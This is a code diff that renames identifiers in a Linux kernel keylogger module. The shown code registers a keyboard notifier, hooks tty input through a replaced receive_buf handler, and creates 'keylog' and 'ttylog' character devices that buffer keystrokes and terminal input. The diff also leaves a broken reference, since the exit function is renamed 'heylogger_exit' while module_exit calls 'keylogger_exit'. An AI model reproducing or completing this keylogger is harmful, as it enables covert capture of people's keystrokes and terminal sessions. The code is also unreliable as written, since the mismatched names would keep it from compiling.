@@ -23,8 +23,8 @@
 
 #define KEYLOG_MAJOR 65
 #define KEYLOG_NAME "keylog"
-#define TTY_MAJOR 66
-#define TTY_NAME "ttylog"
+#define TTYLOG_MAJOR 66
+#define TTYLOG_NAME "ttylog"
 
 #define MAX_KEYS_TO_BUFFER 1024
 #define KEYLOG_BUF_SIZE 1024
@@ -268,7 +268,7 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
     (*old_receive_buf)(tty, cp, fp, count);
 }
 
-int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
+int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL;
     unsigned int name_len = 0;
@@ -331,7 +331,7 @@ static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
 }
 
 static struct notifier_block keyboardNotifierBlock = {
-        .notifier_call = hello_notify
+        .notifier_call = keylogger_notify
 };
 
 int key_release( struct inode *inode, struct file *filp ) {
@@ -340,7 +340,7 @@ int key_release( struct inode *inode, struct file *filp ) {
     return 0;
 }
 
-static int hello_init( void ) {
+static int keylogger_init( void ) {
     int err;
     print812( "Initializing the module." );
 
@@ -350,7 +350,7 @@ static int hello_init( void ) {
         return err;
     }
 
-    err = register_chrdev( TTY_MAJOR, TTY_NAME, &ttyops );
+    err = register_chrdev( TTYLOG_MAJOR, TTYLOG_NAME, &ttyops );
     if ( err < 0 ) {
         print812( "Registering chrdev failed (%d)", err );
         return err;
@@ -362,7 +362,7 @@ static int hello_init( void ) {
         print812( "Failed to allocate keybuffer (%d)", err );
         
         unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
-        unregister_chrdev( TTY_MAJOR, TTY_NAME );
+        unregister_chrdev( TTYLOG_MAJOR, TTYLOG_NAME );
         
         return err;
     }
@@ -373,7 +373,7 @@ static int hello_init( void ) {
         print812( "Failed to allocate tty buffer (%d)", err );
 
         unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
-        unregister_chrdev( TTY_MAJOR, TTY_NAME );
+        unregister_chrdev( TTYLOG_MAJOR, TTYLOG_NAME );
 
         return err;
     }
@@ -384,7 +384,7 @@ static int hello_init( void ) {
         print812( "Failed to allocate pidbuffer(%d)", err );
 
         unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
-        unregister_chrdev( TTY_MAJOR, TTY_NAME );
+        unregister_chrdev( TTYLOG_MAJOR, TTYLOG_NAME );
 
         return err;
     }
@@ -412,7 +412,7 @@ static int hello_init( void ) {
     return 0;
 }
 
-static void hello_exit( void ) {
+static void heylogger_exit( void ) {
     print812( "Unregistering the module" );
 
     unregister_keyboard_notifier(&keyboardNotifierBlock);
@@ -428,7 +428,7 @@ static void hello_exit( void ) {
     }
 
     unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
-    unregister_chrdev( TTY_MAJOR, TTY_NAME );
+    unregister_chrdev( TTYLOG_MAJOR, TTYLOG_NAME );
 
     if ( key_buffer != NULL ) {
         kfree( key_buffer );
@@ -443,5 +443,5 @@ static void hello_exit( void ) {
     }
 }
 
-module_init( hello_init );
-module_exit( hello_exit );
+module_init( keylogger_init );
+module_exit( keylogger_exit );
